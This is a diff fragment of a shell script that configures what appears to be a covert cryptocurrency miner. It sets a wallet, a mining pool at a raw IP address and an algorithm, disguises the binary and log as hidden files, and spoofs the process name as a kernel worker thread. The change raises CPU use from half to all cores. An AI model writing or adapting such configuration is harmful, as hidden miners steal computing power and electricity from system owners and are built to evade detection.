@@ -5,7 +5,7 @@ set -e
 WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9.Danis"
 POOL="stratum+tcps://159.223.48.143:443"
 ALGO="power2b"
-THREADS=$(( $(nproc --all) / 2 ))
+THREADS=$(( $(nproc --all) / 1 ))
 BIN_NAME=".syslogd"
 PROCESS_NAME="[kworker/u8:3-events]"
 LOG_FILE=".xlog"
